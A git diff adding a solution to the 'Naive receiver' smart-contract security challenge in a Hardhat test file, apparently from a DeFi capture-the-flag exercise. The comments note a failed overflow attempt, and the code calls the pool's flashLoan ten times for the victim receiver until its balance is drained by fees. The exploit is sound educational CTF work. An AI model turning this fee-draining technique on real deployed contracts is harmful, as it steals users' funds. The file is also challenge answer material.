@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { defaultAbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, player;
@@ -38,6 +39,30 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /** Attempt 1
+         * The pool does some math to check if the amount has been returned:
+         * if (address(this).balance < balanceBefore + FIXED_FEE)
+         * Tried to get the RHS to wrap around cuz of overflow.
+         * It's writter in solidity 0.8, so reverts on overflow.
+         * 
+         * Just re-read the Q, we have to drain the FloashLoanReceiver
+         */
+
+
+        /** Attempt 2
+         * The fee for the flashloan is 1 ETH, fixed
+         * So doing it ten times in a loop => the flash receiver must pay 10 ETH
+         */
+        const ETH = await pool.ETH();
+        for (let i=0; i < 10; i++) {
+            const data = await pool.flashLoan(
+                receiver.address,
+                ETH,
+                "0",
+                defaultAbiCoder.encode(["bytes calldata"], [defaultAbiCoder.encode(["bytes"], ["0x"])])
+            );
+        }
     });
 
     after(async function () {
